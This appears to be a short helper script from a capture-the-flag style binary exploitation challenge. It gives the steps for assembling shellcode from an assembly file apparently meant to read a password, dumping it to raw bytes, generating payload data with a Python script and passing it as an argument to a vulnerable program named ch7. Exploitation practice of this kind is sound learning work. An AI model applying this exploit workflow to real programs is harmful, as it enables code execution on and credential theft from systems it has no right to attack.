# instructions for generating exploit data

# shellcode assembly is in readpw.s!

# first generate shellcode binary:
#  compile exploit
nasm -f elf -o out.o readpw.s
# dump shellcode
objcopy --output-target=binary --only-section=.text out.o shell.bin

# generate data with python
python3 gen_data.py > data

# then do whatever to run the program with the data as arg
# eg:
./ch7 "$(cat data)"
# or convert data to escaped for `echo -ne`
python -c "print(repr(open('data', 'rb').read())[2:-1])"
# and then run with
./ch7 "$(echo -ne <data from above command>)"